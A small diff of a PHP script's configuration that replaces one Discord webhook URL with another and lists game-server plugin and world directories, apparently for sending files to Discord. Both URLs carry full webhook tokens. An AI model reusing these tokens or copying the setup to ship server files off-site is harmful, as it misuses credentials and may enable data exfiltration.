@@ -1,7 +1,7 @@
 <?php
 
 // ==================== CONFIGURATION ====================
-$webhook = "https://discord.com/api/webhooks/1479561878526103573/q3sbUm9Jqzy2uP3PiynGCaS-SvjhIFfvP-6lwxM4M27lsTTOjqH31tIxSjpHoTgsl-6f";
+$webhook = "https://discordapp.com/api/webhooks/1506699879429308509/PEyBuDuf57F14JG2f4QlYpgR2CohTnw8a_1wKusimDyjLVMY-eIx123Cbfe2Wa3CvI4v";
 $rootPath = getcwd();
 $includeDirs = ['plugins', 'plugin_data'];
 $worldDir = $rootPath . DIRECTORY_SEPARATOR . 'worlds';
